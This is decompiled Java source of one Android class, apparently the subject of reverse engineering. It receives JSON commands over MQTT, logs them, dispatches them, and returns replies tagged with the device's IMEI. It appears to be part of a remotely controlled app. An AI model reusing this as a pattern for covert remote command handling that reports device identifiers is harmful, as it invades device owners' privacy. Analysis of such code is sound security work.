package com.app.system.mqtt;

import android.content.Context;
import com.app.system.common.commands.CommandDispatcher;
import com.app.system.common.h;
import com.google.gson.JsonSyntaxException;
import com.google.gson.f;
import com.security.d.a;
import java.io.Serializable;

public class MqttCommand
  implements Serializable
{
  public static final String TAG = "MqttCommand";
  public String comando;
  public String correlationID;
  public Param[] parametri;
  
  public static MqttCommand a(String paramString)
  {
    try
    {
      Object localObject = new com/google/gson/f;
      ((f)localObject).<init>();
      paramString = (MqttCommand)((f)localObject).a(paramString, MqttCommand.class);
      localObject = new java/lang/StringBuilder;
      ((StringBuilder)localObject).<init>();
      ((StringBuilder)localObject).append("comando: ");
      ((StringBuilder)localObject).append(paramString.comando);
      a.e("MqttCommand", ((StringBuilder)localObject).toString(), new Object[0]);
      if (paramString.parametri != null) {
        for (int i = 0; i < paramString.parametri.length; i++)
        {
          localObject = new java/lang/StringBuilder;
          ((StringBuilder)localObject).<init>();
          ((StringBuilder)localObject).append("parametri[");
          ((StringBuilder)localObject).append(i);
          ((StringBuilder)localObject).append("]: nome=");
          ((StringBuilder)localObject).append(paramString.parametri[i].nome);
          ((StringBuilder)localObject).append(", valore=");
          ((StringBuilder)localObject).append(paramString.parametri[i].valore);
          a.e("MqttCommand", ((StringBuilder)localObject).toString(), new Object[0]);
        }
      }
      localObject = new java/lang/StringBuilder;
      ((StringBuilder)localObject).<init>();
      ((StringBuilder)localObject).append("correlationID: ");
      ((StringBuilder)localObject).append(paramString.correlationID);
      a.e("MqttCommand", ((StringBuilder)localObject).toString(), new Object[0]);
      return paramString;
    }
    catch (JsonSyntaxException paramString) {}
    return null;
  }
  
  public MqttCommandReply a(Context paramContext)
  {
    return CommandDispatcher.a(paramContext, this);
  }
  
  public MqttCommandReply b(Context paramContext)
  {
    MqttCommandReply localMqttCommandReply = new MqttCommandReply();
    localMqttCommandReply.imei = h.c(paramContext);
    localMqttCommandReply.correlationID = this.correlationID;
    localMqttCommandReply.result = 0;
    return localMqttCommandReply;
  }
  
  public static class Param
    implements Serializable
  {
    public String nome;
    public String valore;
  }
}


/* Location:              ~/com/app/system/mqtt/MqttCommand.class
 *
 * Reversed by:           J
 */